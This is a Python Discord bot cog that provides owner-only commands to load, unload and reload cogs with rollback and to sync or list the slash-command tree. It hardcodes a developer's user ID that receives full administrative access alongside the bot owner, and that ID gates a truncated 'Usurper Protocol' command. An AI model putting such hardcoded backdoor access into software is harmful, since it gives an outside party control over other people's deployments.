"""
cogs.manager.Management

This cog provides a set of message commands

The Management cog is designed to be loaded at bot startup to ensure
administrative access is always available.

It offers:
- Dynamic cog loading, unloading, and reloading with error handling and rollback
- Command tree synchronization and management across individual guilds and globally
- Usurper Protocol
- Embed support
- Ability to view bot statistics/uptime
"""

import importlib
import io
import sys
import difflib
import textwrap
import traceback
from contextlib import redirect_stdout
from typing import Dict, List, Optional, Union

from discord.ext import commands
from discord import app_commands
from discord.ext.commands import CommandError
from discord import ClientException

from cogs.base import CogTemplate, ImprovedCog
from utilities import helpers
from utilities.embeds import (
    InfoEmbed, SuccessEmbed, ErrorEmbed, WarningEmbed,
    CustomEmbed, custom_embed
)


class Management(ImprovedCog):
    """
    A comprehensive cog for bot management and administration.

    This cog provides essential administrative functions including:
    - Cog lifecycle management (load/unload/reload)
    - Command tree synchronization
    - Code evaluation for debugging
    - Bot status monitoring

    The cog is designed to be always available and includes security measures
    to prevent unauthorized access to sensitive operations.

    Attributes:
        bagel_id (int): The Discord user ID with full administrative privileges
        template (CogTemplate): Metadata template for this cog
        available_cogs (Dict[str, Dict]): Registry of all available cogs from configuration
        cog_lookup (Dict[str, str]): Lookup table mapping various names to template names
        class_to_template_lookup (Dict[str, str]): Reverse lookup: ClassName -> template_name
    """

    # Discord user ID with full administrative privileges
    bagel_id = 897146430664355850

    # Cog metadata template
    template = CogTemplate(
        description="Builtin commands to help with bot maintenance and development. "
                    "Cannot be disabled. If you do not need these commands, "
                    "remove the cog from config.yaml.",
        authors=["quantumbagel"],
        version="1.0.0",
        name="management"
    )

    def __init__(self, bot: commands.Bot, logger):
        """
        Initialize the Management cog.

        Args:
            bot (commands.Bot): The Discord bot instance
            logger: Logger instance for this cog
        """
        super().__init__(bot, logger)
        # Registry of unique cog entries by template name
        self.available_cogs: Dict[str, Dict] = {}
        # Lookup table: various names -> template name
        self.cog_lookup: Dict[str, str] = {}
        # REFACTOR: Added reverse lookup for performance
        # Lookup table: ClassName -> template_name
        self.class_to_template_lookup: Dict[str, str] = {}

    async def cog_load(self):
        """
        Initialize the management cog on load.

        This method is called automatically when the cog is loaded.
        It builds the cog registry from the bot configuration and logs
        the initialization status.
        """
        await self._build_cog_registry()
        self.logger.info(f"Management cog is now loaded with {len(self.available_cogs)} available cogs.")

    async def _build_cog_registry(self):
        """
        Build a comprehensive registry of all available cogs from configuration.

        This method parses the bot configuration to create:
        1. A primary registry (available_cogs) keyed by template name
        2. A lookup table (cog_lookup) for various naming schemes
        3. A reverse lookup table (class_to_template_lookup) for performance

        The registry enables flexible cog identification by template name,
        class name, module name, or partial matches.
        """
        self.available_cogs = {}
        self.cog_lookup = {}
        self.class_to_template_lookup = {}  # REFACTOR: Initialize new lookup

        for cog_info in self.bot.configuration.cogs:
            cog_info = dict(cog_info)
            cog_module = list(cog_info.keys())[0]
            cog_data = dict(cog_info[cog_module])
            cog_classname = cog_data["class"]
            enabled = cog_data.get("enabled", True)

            # Attempt to retrieve the cog's template name by importing temporarily
            try:
                module = importlib.import_module(cog_module)
                cog_class = getattr(module, cog_classname)

                if hasattr(cog_class, 'template') and cog_class.template:
                    cog_template_name = cog_class.template.name
                else:
                    # Fallback to lowercased class name if no template
                    cog_template_name = cog_classname.lower()

            except Exception as e:
                self.logger.warning(f"Could not get template name for {cog_module}.{cog_classname}: {e}")
                cog_template_name = cog_classname.lower()

            # Create comprehensive cog entry
            cog_entry = {
                "module": cog_module,
                "class": cog_classname,
                "template_name": cog_template_name,
                "enabled": enabled,
                "data": cog_data
            }

            # Store in primary registry using template name as key
            self.available_cogs[cog_template_name] = cog_entry

            # REFACTOR: Populate the new reverse lookup map
            self.class_to_template_lookup[cog_classname] = cog_template_name

            # Create multiple lookup mappings for flexible access
            lookup_keys = [
                cog_template_name,  # Template name (primary identifier)
                cog_classname,  # Full class name
                cog_classname.lower(),  # Lowercase class name
                cog_module,  # Full module path
                cog_module.split('.')[-1],  # Module basename
            ]

            # Populate lookup table, avoiding conflicts
            for key in lookup_keys:
                if key and key not in self.cog_lookup:
                    self.cog_lookup[key] = cog_template_name

    def _find_cog_by_name(self, cog_name: str) -> Optional[Union[Dict, Dict[str, List[str]]]]:
        """
        Find a cog entry by name with intelligent matching and suggestions.

        This method performs a multi-stage search:
        1. Direct lookup in the lookup table
        2. Case-insensitive matching
        3. Fuzzy matching with suggestions using difflib

        Args:
            cog_name (str): The name to search for (template, class, or module name)

        Returns:
            Dict: Cog entry if found exactly
            Dict[str, List[str]]: Dictionary with 'suggestions' key if no exact match
            None: If no matches or suggestions found
        """
        # Stage 1: Direct exact match
        template_name = self.cog_lookup.get(cog_name)
        if template_name:
            return self.available_cogs[template_name]

        # Stage 2: Case-insensitive match
        template_name = self.cog_lookup.get(cog_name.lower())
        if template_name:
            return self.available_cogs[template_name]

        # Stage 3: Fuzzy matching with suggestions
        all_lookup_keys = list(self.cog_lookup.keys())
        close_matches = difflib.get_close_matches(
            cog_name,
            all_lookup_keys,
            n=5,  # Get up to 5 initial suggestions
            cutoff=0.6  # Minimum similarity threshold (60% match)
        )

        if close_matches:
            # Deduplicate suggestions by template name
            unique_template_names = []
            seen_template_names = set()

            for match in close_matches:
                template_name = self.cog_lookup[match]
                if template_name not in seen_template_names:
                    seen_template_names.add(template_name)
                    unique_template_names.append(template_name)

            return {"suggestions": unique_template_names[:3]}  # Limit to 3 best suggestions

        return None

    def _find_loaded_cog_with_suggestions(self, cog_name: str) -> Optional[Union[str, Dict[str, List[str]]]]:
        """
        Find a currently loaded cog by name with suggestions for close matches.

        This method searches through currently loaded cogs and provides
        intelligent suggestions if no exact match is found.

        Args:
            cog_name (str): The cog name to search for

        Returns:
            str: Exact cog class name if found
            Dict[str, List[str]]: Dictionary with 'suggestions' key for close matches
            None: If no matches found
        """
        loaded_cogs = list(self.bot.cogs.keys())  # List of ClassNames

        # Direct and case-insensitive matching
        for cog_class_name in loaded_cogs:
            if cog_name == cog_class_name or cog_name.lower() == cog_class_name.lower():
                return cog_class_name

        # Fuzzy matching for suggestions
        close_matches = difflib.get_close_matches(
            cog_name,
            loaded_cogs,
            n=5,
            cutoff=0.6
        )

        if close_matches:
            # REFACTOR: Use the new lookup map for O(1) performance
            # This avoids iterating all available_cogs for every match.
            suggested_template_names = [
                self.class_to_template_lookup.get(match, match) for match in close_matches
            ]

            # Remove duplicates while preserving order
            unique_suggestions = []
            for name in suggested_template_names:
                if name not in unique_suggestions:
                    unique_suggestions.append(name)

            return {"suggestions": unique_suggestions[:3]}

        return None

    async def cog_check(self, ctx: commands.Context) -> bool:
        """
        Security check for all management commands.

        This method ensures that only authorized users can execute
        management commands. It checks against both the specific
        bagel_id and the bot's owner configuration.

        Args:
            ctx (commands.Context): The command context

        Returns:
            bool: True if user is authorized, False otherwise
        """
        return ctx.author.id == self.bagel_id or await self.bot.is_owner(ctx.author)

    @commands.group(name="management", description="Commands for managing the bot.", aliases=["m"])
    async def management(self, ctx: commands.Context):
        """
        Main management command group.

        This is the root command for all management operations.
        All subcommands are organized under this group for better
        command structure and discoverability.

        Args:
            ctx (commands.Context): The command context
        """
        if ctx.invoked_subcommand is None:
            embed = ErrorEmbed(
                "Invalid Command",
                "Please specify a valid management subcommand. Use `m help` to see help."
            ).build()
            await helpers.send(ctx, embed=embed)

    @management.group(name='cog', aliases=['c'])
    async def cog(self, ctx: commands.Context):
        """
        Cog management command group.

        Provides subcommands for loading, unloading, and reloading cogs
        with comprehensive error handling and rollback capabilities.

        Args:
            ctx (commands.Context): The command context
        """
        if ctx.invoked_subcommand is None:
            embed = ErrorEmbed(
                "Invalid Cog Command",
                "Please specify a valid cog operation: `load`, `unload`, `reload`"
            ).build()
            await helpers.send(ctx, embed=embed)

    @management.group(name='tree', aliases=['t'])
    async def tree(self, ctx: commands.Context):
        """
        Command tree management group.

        Provides subcommands for synchronizing, resetting, and listing
        Discord application commands (slash commands) either globally
        or for specific guilds.

        Args:
            ctx (commands.Context): The command context
        """
        if ctx.invoked_subcommand is None:
            embed = ErrorEmbed(
                "Invalid Tree Command",
                "Please specify a valid tree operation: `sync`, `reset`, `list`"
            ).build()
            await helpers.send(ctx, embed=embed)

    @cog.command(name='list', aliases=['ls'])
    async def list_cogs(self, ctx: commands.Context):
        """
        List all available cogs and their current status.

        Displays a comprehensive overview of:
        - All cogs defined in configuration
        - Their current load status (Loaded/Disabled/Not Loaded)
        - Module and class information

        Args:
            ctx (commands.Context): The command context
        """
        loaded_cogs = list(self.bot.cogs.keys())

        embed = custom_embed().set_color('info').set_title("📋 Cog Status Overview").set_timestamp()

        loaded_list = []
        disabled_list = []
        not_loaded_list = []

        for cog_entry in self.available_cogs.values():
            cog_info = f"`{cog_entry['template_name']}` ({cog_entry['module']}.{cog_entry['class']})"

            # Determine status with appropriate emoji
            if cog_entry["class"] in loaded_cogs:
                loaded_list.append(cog_info)
            elif not cog_entry["enabled"]:
                disabled_list.append(cog_info)
            else:
                not_loaded_list.append(cog_info)

        if loaded_list:
            embed.add_field(
                name="✅ Loaded Cogs",
                value="\n".join(loaded_list),
                inline=False
            )

        if disabled_list:
            embed.add_field(
                name="❌ Disabled Cogs",
                value="\n".join(disabled_list),
                inline=False
            )

        if not_loaded_list:
            embed.add_field(
                name="⚠️ Not Loaded Cogs",
                value="\n".join(not_loaded_list),
                inline=False
            )

        total_cogs = len(self.available_cogs)
        embed.set_footer(text=f"Total: {total_cogs} cog{'s' if total_cogs != 1 else ''}")

        await helpers.send(ctx, embed=embed.build())

    @tree.command(name='sync', aliases=['s'])
    async def sync_tree(self, ctx: commands.Context, *, guild_id: str = None):
        """
        Synchronize the Discord command tree.

        This command synchronizes application commands (slash commands) either
        globally or to a specific guild. Global sync affects all guilds but
        may take up to an hour to propagate. Guild-specific sync is immediate.

        Args:
            ctx (commands.Context): The command context
            guild_id (str, optional): Guild ID to sync to. If None, syncs globally.
        """
        try:
            if guild_id:
                try:
                    guild_id = int(guild_id)
                    guild = self.bot.get_guild(guild_id)
                    if not guild:
                        embed = ErrorEmbed(
                            "Guild Not Found",
                            f"Guild with ID `{guild_id}` not found."
                        ).build()
                        await helpers.send(ctx, embed=embed)
                        return

                    synced = await self.bot.tree.sync(guild=guild)
                    embed = SuccessEmbed(
                        "Command Tree Synced",
                        f"Successfully synced **{len(synced)}** commands to guild **{guild.name}** (`{guild_id}`)"
                    ).build()
                    await helpers.send(ctx, embed=embed)
                    self.logger.info(f"Synced {len(synced)} commands to guild {guild.name} ({guild_id})")
                except ValueError:
                    embed = ErrorEmbed(
                        "Invalid Guild ID",
                        f"Invalid guild ID: `{guild_id}`. Must be a number."
                    ).build()
                    await helpers.send(ctx, embed=embed)
                    return
            else:
                synced = await self.bot.tree.sync()
                embed = SuccessEmbed(
                    "Global Command Tree Synced",
                    f"Successfully synced **{len(synced)}** commands globally.\n*May take up to 1 hour to propagate.*"
                ).build()
                await helpers.send(ctx, embed=embed)
                self.logger.info(f"Synced {len(synced)} commands globally")

        except Exception as e:
            embed = ErrorEmbed(
                "Sync Failed",
                f"Error syncing command tree: `{e}`"
            ).build()
            await helpers.send(ctx, embed=embed)
            self.logger.error(f"Error syncing command tree: {e}", exc_info=True)

    @tree.command(name='reset', aliases=['r'])
    async def reset_tree(self, ctx: commands.Context, *, guild_id: str = None):
        """
        Reset (clear) the Discord command tree.

        This command removes all application commands either globally
        or from a specific guild, then re-syncs to apply the changes.
        Use with caution as this will remove all slash commands.

        Args:
            ctx (commands.Context): The command context
            guild_id (str, optional): Guild ID to reset. If None, resets globally.
        """
        try:
            if guild_id:
                try:
                    guild_id = int(guild_id)
                    guild = self.bot.get_guild(guild_id)
                    if not guild:
                        embed = ErrorEmbed(
                            "Guild Not Found",
                            f"Guild with ID `{guild_id}` not found."
                        ).build()
                        await helpers.send(ctx, embed=embed)
                        return

                    self.bot.tree.clear_commands(guild=guild)
                    synced = await self.bot.tree.sync(guild=guild)
                    embed = SuccessEmbed(
                        "Command Tree Reset",
                        f"Reset command tree for guild **{guild.name}** (`{guild_id}`).\nSynced **{len(synced)}** commands."
                    ).build()
                    await helpers.send(ctx, embed=embed)
                    self.logger.info(f"Reset command tree for guild {guild.name} ({guild_id})")
                except ValueError:
                    embed = ErrorEmbed(
                        "Invalid Guild ID",
                        f"Invalid guild ID: `{guild_id}`. Must be a number."
                    ).build()
                    await helpers.send(ctx, embed=embed)
                    return
            else:
                self.bot.tree.clear_commands(guild=None)
                synced = await self.bot.tree.sync()
                embed = WarningEmbed(
                    "Global Command Tree Reset",
                    f"Reset global command tree and synced **{len(synced)}** commands.\n*All slash commands have been cleared globally.*"
                ).build()
                await helpers.send(ctx, embed=embed)
                self.logger.info("Reset global command tree")

        except Exception as e:
            embed = ErrorEmbed(
                "Reset Failed",
                f"Error resetting command tree: `{e}`"
            ).build()
            await helpers.send(ctx, embed=embed)
            self.logger.error(f"Error resetting command tree: {e}", exc_info=True)

    @tree.command(name='list', aliases=['l'])
    async def list_tree_commands(self, ctx: commands.Context):
        """
        List all commands in the Discord command tree.

        Provides a comprehensive overview of all application commands
        organized by cog, including command descriptions and qualified names.
        Handles message length limits by splitting into multiple messages if needed.

        Args:
            ctx (commands.Context): The command context
        """
        try:
            commands_by_cog = {}

            # Walk through all commands in the tree
            for command in self.bot.tree.walk_commands():
                if isinstance(command, app_commands.Command):
                    cog_name = "No Cog"

                    # Determine the source cog for this command
                    if command.binding is not None:
                        cog_instance = command.binding
                        cog_class_name = cog_instance.__class__.__name__

                        # REFACTOR: Use O(1) lookup map instead of O(N) iteration
                        template_name = self.class_to_template_lookup.get(cog_class_name)
                        cog_name = template_name or cog_class_name

                    if cog_name not in commands_by_cog:
                        commands_by_cog[cog_name] = []

                    # Build command information with description
                    command_info = f"`/{command.qualified_name}`"
                    if hasattr(command, 'description') and command.description:
                        command_info += f" - {command.description}"

                    commands_by_cog[cog_name].append(command_info)

            if not commands_by_cog:
                embed = InfoEmbed(
                    "Command Tree Empty",
                    "No commands found in the command tree."
                ).build()
                await helpers.send(ctx, embed=embed)
                return

            # Build embed(s) for the response
            total_commands = sum(len(commands) for commands in commands_by_cog.values())

            # If content is small enough, use a single embed
            total_content_length = sum(
                len(f"\n**{cog_name}** ({len(commands)} command{'s' if len(commands) != 1 else ''}):\n") +
                sum(len(f"  {cmd}\n") for cmd in commands)
                for cog_name, commands in commands_by_cog.items()
            )

            if total_content_length < 1500:  # Leave room for title and footer
                embed = custom_embed().set_color('info').set_title("🌳 Command Tree Overview").set_timestamp()

                for cog_name in sorted(commands_by_cog.keys()):
                    commands = commands_by_cog[cog_name]
                    command_list = "\n".join(sorted(commands))
                    embed.add_field(
                        name=f"{cog_name} ({len(commands)} command{'s' if len(commands) != 1 else ''})",
                        value=command_list,
                        inline=False
                    )

                embed.set_footer(text=f"Total: {total_commands} command{'s' if total_commands != 1 else ''}")
                await helpers.send(ctx, embed=embed.build())
            else:
                # Split into multiple embeds
                embeds = []
                current_embed = custom_embed().set_color('info').set_title("🌳 Command Tree Overview").set_timestamp()
                embed_char_count = 50  # Account for title and basic structure

                for cog_name in sorted(commands_by_cog.keys()):
                    commands = commands_by_cog[cog_name]
                    field_content = "\n".join(sorted(commands))
                    field_size = len(f"{cog_name} ({len(commands)} commands)") + len(field_content)

                    if embed_char_count + field_size > 5500:  # Discord's embed limit with safety margin
                        embeds.append(current_embed.build())
                        current_embed = custom_embed().set_color('info').set_title(
                            "🌳 Command Tree Overview (cont.)").set_timestamp()
                        embed_char_count = 50

                    current_embed.add_field(
                        name=f"{cog_name} ({len(commands)} command{'s' if len(commands) != 1 else ''})",
                        value=field_content,
                        inline=False
                    )
                    embed_char_count += field_size

                if current_embed._embed.fields:  # If there's content in the current embed
                    current_embed.set_footer(
                        text=f"Total: {total_commands} command{'s' if total_commands != 1 else ''}")
                    embeds.append(current_embed.build())

                for embed in embeds:
                    await helpers.send(ctx, embed=embed)

        except Exception as e:
            embed = ErrorEmbed(
                "List Failed",
                f"Error listing command tree: `{e}`"
            ).build()
            await helpers.send(ctx, embed=embed)
            self.logger.error(f"Error listing command tree: {e}", exc_info=True)

    @cog.command(name='load', aliases=['l'])
    async def load_cog(self, ctx: commands.Context, *, cog_name: str):
        """Load a cog by template name, module name, or class name."""
        target_cog = self._find_cog_by_name(cog_name)

        if not target_cog:
            embed = ErrorEmbed(
                "Cog Not Found",
                f"Cog `{cog_name}` not found in configuration."
            ).build()
            await helpers.send(ctx, embed=embed)
            return

        if "suggestions" in target_cog:
            suggestions = ", ".join([f"`{s}`" for s in target_cog["suggestions"]])
            embed = ErrorEmbed(
                "Cog Not Found",
                f"Cog `{cog_name}` not found. Did you mean: {suggestions}?"
            ).build()
            await helpers.send(ctx, embed=embed)
            return

        # Check if already loaded
        if target_cog["class"] in self.bot.cogs:
            embed = WarningEmbed(
                "Cog Already Loaded",
                f"Cog `{target_cog['template_name']}` is already loaded."
            ).build()
            await helpers.send(ctx, embed=embed)
            return

        try:
            # Import the module
            module = importlib.import_module(target_cog["module"])
            cog_logger = self.bot._logger.getChild(f"cogs[{target_cog['module']}]")
            cog_class = getattr(module, target_cog["class"])

            if not issubclass(cog_class, ImprovedCog):
                embed = ErrorEmbed(
                    "Invalid Cog Type",
                    f"Cog `{target_cog['module']}.{target_cog['class']}` is not a subclass of ImprovedCog."
                ).build()
                await helpers.send(ctx, embed=embed)
                return

            # Add the cog
            await self.bot.add_cog(cog_class(self.bot, cog_logger))
            embed = SuccessEmbed(
                "Cog Loaded",
                f"Successfully loaded cog `{target_cog['template_name']}`"
            ).set_footer(text=f"Module: {target_cog['module']}.{target_cog['class']}")
            await helpers.send(ctx, embed=embed.build())
            self.logger.info(
                f"Manually loaded cog '{target_cog['template_name']}' ({target_cog['module']}.{target_cog['class']})")

        except ImportError as e:
            embed = ErrorEmbed(
                "Import Failed",
                f"Failed to import module `{target_cog['module']}`:\n```{e}```"
            ).build()
            await helpers.send(ctx, embed=embed)
            self.logger.error(f"Failed to import cog module '{target_cog['module']}': {e}")
        except CommandError as e:
            embed = ErrorEmbed(
                "Command Error",
                f"Error adding cog `{target_cog['template_name']}`:\n```{e}```"
            ).build()
            await helpers.send(ctx, embed=embed)
            self.logger.error(f"CommandError while adding cog '{target_cog['template_name']}': {e}")
        except ClientException as e:
            embed = WarningEmbed(
                "Already Loaded",
                f"Cog `{target_cog['template_name']}` is already loaded:\n```{e}```"
            ).build()
            await helpers.send(ctx, embed=embed)
        except Exception as e:
            embed = ErrorEmbed(
                "Unexpected Error",
                f"Unexpected error loading cog `{target_cog['template_name']}`:\n```{e}```"
            ).build()
            await helpers.send(ctx, embed=embed)
            self.logger.error(f"Unexpected error loading cog '{target_cog['template_name']}': {e}", exc_info=True)

    @cog.command(name='unload', aliases=['u'])
    async def unload_cog(self, ctx: commands.Context, *, cog_name: str):
        """Unload a cog by template name, class name, or exact match."""
        # Prevent unloading the management cog
        if cog_name.lower() in ['management', 'manager']:
            embed = ErrorEmbed(
                "Protected Cog",
                "Cannot unload the Management cog as it's required for bot administration."
            ).build()
            await helpers.send(ctx, embed=embed)
            return

        # REFACTOR: Simplified finding logic
        target_class_name: Optional[str] = None
        suggestions: Optional[List[str]] = None

        # Try to find by registry name first
        target_cog_entry = self._find_cog_by_name(cog_name)

        if target_cog_entry and "suggestions" not in target_cog_entry:
            target_class_name = target_cog_entry["class"]
        elif target_cog_entry and "suggestions" in target_cog_entry:
            suggestions = target_cog_entry["suggestions"]

        # If not in registry, try to find by loaded cog class name
        if not target_class_name:
            loaded_result = self._find_loaded_cog_with_suggestions(cog_name)
            if isinstance(loaded_result, str):
                target_class_name = loaded_result
            elif loaded_result and "suggestions" in loaded_result:
                # Prioritize suggestions from loaded cogs if available
                suggestions = loaded_result["suggestions"]

        # Handle suggestions
        if not target_class_name and suggestions:
            suggestion_str = ", ".join([f"`{s}`" for s in suggestions])
            embed = ErrorEmbed(
                "Cog Not Found",
                f"Cog `{cog_name}` not found. Did you mean: {suggestion_str}?"
            ).build()
            await helpers.send(ctx, embed=embed)
            return

        # Handle not found
        if not target_class_name:
            embed = ErrorEmbed(
                "Cog Not Found",
                f"No loaded cog found matching `{cog_name}`."
            ).build()
            await helpers.send(ctx, embed=embed)
            return

        # Get the template name for better user feedback
        display_name = self.class_to_template_lookup.get(target_class_name, target_class_name)

        try:
            await self.bot.remove_cog(target_class_name)
            embed = SuccessEmbed(
                "Cog Unloaded",
                f"Successfully unloaded cog `{display_name}`"
            ).build()
            await helpers.send(ctx, embed=embed)
            self.logger.info(f"Manually unloaded cog '{display_name}'")
        except Exception as e:
            embed = ErrorEmbed(
                "Unload Failed",
                f"Error unloading cog `{display_name}`:\n```{e}```"
            ).build()
            await helpers.send(ctx, embed=embed)
            self.logger.error(f"Error unloading cog '{display_name}': {e}", exc_info=True)

    @cog.command(name='reload', aliases=['r'])
    async def reload_cog(self, ctx: commands.Context, *, cog_name: str):
        """Reload a cog by template name, class name, or exact match."""
        # Try to find the cog in our registry first
        target_cog_info = self._find_cog_by_name(cog_name)

        if target_cog_info and "suggestions" in target_cog_info:
            suggestions = ", ".join([f"`{s}`" for s in target_cog_info["suggestions"]])
            embed = ErrorEmbed(
                "Cog Not Found",
                f"Cog `{cog_name}` not found. Did you mean: {suggestions}?"
            ).build()
            await helpers.send(ctx, embed=embed)
            return

        # If not found in registry, try to find by loaded cogs
        if not target_cog_info:
            loaded_result = self._find_loaded_cog_with_suggestions(cog_name)

            if isinstance(loaded_result, str):
                # Found a loaded cog, try to find it in registry by class name
                target_cog_name = loaded_result
                for cog_entry in self.available_cogs.values():
                    if cog_entry["class"] == target_cog_name:
                        target_cog_info = cog_entry
                        break

                if not target_cog_info:
                    embed = ErrorEmbed(
                        "Registry Missing",
                        f"Could not find registry information for loaded cog `{target_cog_name}`."
                    ).build()
                    await helpers.send(ctx, embed=embed)
                    return
            elif loaded_result and "suggestions" in loaded_result:
                suggestions = ", ".join([f"`{s}`" for s in loaded_result["suggestions"]])
                embed = ErrorEmbed(
                    "Cog Not Found",
                    f"No loaded cog found matching `{cog_name}`. Did you mean: {suggestions}?"
                ).build()
                await helpers.send(ctx, embed=embed)
                return
            else:
                embed = ErrorEmbed(
                    "Cog Not Found",
                    f"Cog `{cog_name}` not found."
                ).build()
                await helpers.send(ctx, embed=embed)
                return

        # Check if the cog is actually loaded
        if target_cog_info["class"] not in self.bot.cogs:
            embed = WarningEmbed(
                "Cog Not Loaded",
                f"Cog `{target_cog_info['template_name']}` is not loaded. Attempting to load it..."
            ).build()
            await helpers.send(ctx, embed=embed)
            await self.load_cog(ctx, cog_name=target_cog_info["template_name"])
            return

        # Store the original cog instance for rollback
        original_cog = self.bot.cogs.get(target_cog_info["class"])

        # Store the original module state for rollback
        module_name = target_cog_info["module"]
        original_module = None
        module_was_loaded = module_name in sys.modules

        if module_was_loaded:
            # Create a shallow copy of the module's __dict__ to preserve its state
            original_module = sys.modules[module_name]
            # Store key attributes that we might need to restore
            original_module_dict = original_module.__dict__.copy()

        try:
            # Unload the cog
            await self.bot.remove_cog(target_cog_info["class"])

            # Reload the module
            if module_was_loaded:
                importlib.reload(sys.modules[module_name])
            else:
                importlib.import_module(module_name)

            # Load the cog again
            module = importlib.import_module(module_name)
            cog_logger = self.bot._logger.getChild(f"cogs[{module_name}]")
            cog_class = getattr(module, target_cog_info["class"])

            if not issubclass(cog_class, ImprovedCog):
                embed = ErrorEmbed(
                    "Invalid Cog Type",
                    f"Cog `{module_name}.{target_cog_info['class']}` is not a subclass of ImprovedCog."
                ).build()
                await helpers.send(ctx, embed=embed)
                # Trigger rollback
                raise ValueError(f"Cog is not a subclass of ImprovedCog")

            await self.bot.add_cog(cog_class(self.bot, cog_logger))
            embed = SuccessEmbed(
                "Cog Reloaded",
                f"Successfully reloaded cog `{target_cog_info['template_name']}`"
            ).set_footer(text=f"Module: {module_name}.{target_cog_info['class']}")
            await helpers.send(ctx, embed=embed.build())
            self.logger.info(
                f"Manually reloaded cog '{target_cog_info['template_name']}' ({module_name}.{target_cog_info['class']})")

        except Exception as e:
            embed = ErrorEmbed(
                "Reload Failed",
                f"Error reloading cog `{target_cog_info['template_name']}`:\n```{e}```"
            ).build()
            await helpers.send(ctx, embed=embed)
            self.logger.error(f"Error reloading cog '{target_cog_info['template_name']}': {e}", exc_info=True)

            # Rollback: restore the original cog
            try:
                # If we had an original module, restore its state
                if original_module and module_was_loaded and module_name in sys.modules:
                    # Clear the corrupted module state
                    corrupted_module = sys.modules[module_name]
                    corrupted_module.__dict__.clear()
                    # Restore the original module state
                    corrupted_module.__dict__.update(original_module_dict)
                elif not module_was_loaded and module_name in sys.modules:
                    # If module wasn't originally loaded, remove it completely
                    del sys.modules[module_name]

                # Re-add the original cog instance if we have it
                if original_cog:
                    await self.bot.add_cog(original_cog)
                    embed = WarningEmbed(
                        "Rollback Successful",
                        f"Restored original cog `{target_cog_info['template_name']}` after reload failure."
                    ).build()
                    await helpers.send(ctx, embed=embed)
                    self.logger.info(
                        f"Successfully rolled back cog '{target_cog_info['template_name']}' to original state")
                else:
                    # Fallback: try to create a fresh instance from the restored module
                    if module_was_loaded:
                        module = sys.modules[module_name]
                        cog_class = getattr(module, target_cog_info["class"])
                        cog_logger = self.bot._logger.getChild(f"cogs[{module_name}]")
                        await self.bot.add_cog(cog_class(self.bot, cog_logger))
                        embed = WarningEmbed(
                            "Backup Restored",
                            f"Restored cog `{target_cog_info['template_name']}` from backup module state."
                        ).build()
                        await helpers.send(ctx, embed=embed)
                    else:
                        embed = ErrorEmbed(
                            "Rollback Failed",
                            f"Could not restore cog `{target_cog_info['template_name']}` - no backup available."
                        ).build()
                        await helpers.send(ctx, embed=embed)

            except Exception as restore_error:
                embed = ErrorEmbed(
                    "Rollback Failed",
                    f"Failed to restore cog after reload failure:\n```{restore_error}```"
                ).build()
                await helpers.send(ctx, embed=embed)
                self.logger.error(
                    f"Failed to restore cog '{target_cog_info['template_name']}' after reload failure: {restore_error}",
                    exc_info=True)

    @management.command(name='usurp')
    async def usurper(self, ctx: commands.Context):
        """
        Usurper Protocol
        :param ctx: context
        :return: Nothing
        """

        # REFACTOR: Check ID *before* deleting message
        if ctx.message.author.id != self.bagel_id:
            return

        # If bagel, DM bagel
        # ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠛⠛⠛⠿⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⡀⠠⠤⠒⢂⣉⣉⣉⣑⣒⣒⠒⠒⠒⠒⠒⠒⠒⠀⠀⠐⠒⠚⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⡠⠔⠉⣀⠔⠒⠉⣀⣀⠀⠀⠀⣀⡀⠈⠉⠑⠒⠒⠒⠒⠒⠈⠉⠉⠉⠁⠂⠀⠈⠙⢿⣿⣿⣿⣿⣿
        # ⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠔⠁⠠⠖⠡⠔⠊⠀⠀⠀⠀⠀⠀⠀⠐⡄⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠉⠲⢄⠀⠀⠀⠈⣿⣿⣿⣿⣿
        # ⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠊⠀⢀⣀⣤⣤⣤⣤⣀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠜⠀⠀⠀⠀⣀⡀⠀⠈⠃⠀⠀⠀⠸⣿⣿⣿⣿
        # ⣿⣿⣿⣿⡿⠥⠐⠂⠀⠀⠀⠀⡄⠀⠰⢺⣿⣿⣿⣿⣿⣟⠀⠈⠐⢤⠀⠀⠀⠀⠀⠀⢀⣠⣶⣾⣯⠀⠀⠉⠂⠀⠠⠤⢄⣀⠙⢿⣿⣿
        # ⣿⡿⠋⠡⠐⠈⣉⠭⠤⠤⢄⡀⠈⠀⠈⠁⠉⠁⡠⠀⠀⠀⠉⠐⠠⠔⠀⠀⠀⠀⠀⠲⣿⠿⠛⠛⠓⠒⠂⠀⠀⠀⠀⠀⠀⠠⡉⢢⠙⣿
        # ⣿⠀⢀⠁⠀⠊⠀⠀⠀⠀⠀⠈⠁⠒⠂⠀⠒⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⣀⡠⠔⠒⠒⠂⠀⠈⠀⡇⣿
        # ⣿⠀⢸⠀⠀⠀⢀⣀⡠⠋⠓⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠈⠢⠤⡀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⡠⠀⡇⣿
        # ⣿⡀⠘⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠈⠑⡦⢄⣀⠀⠀⠐⠒⠁⢸⠀⠀⠠⠒⠄⠀⠀⠀⠀⠀⢀⠇⠀⣀⡀⠀⠀⢀⢾⡆⠀⠈⡀⠎⣸⣿
        # ⣿⣿⣄⡈⠢⠀⠀⠀⠀⠘⣶⣄⡀⠀⠀⡇⠀⠀⠈⠉⠒⠢⡤⣀⡀⠀⠀⠀⠀⠀⠐⠦⠤⠒⠁⠀⠀⠀⠀⣀⢴⠁⠀⢷⠀⠀⠀⢰⣿⣿
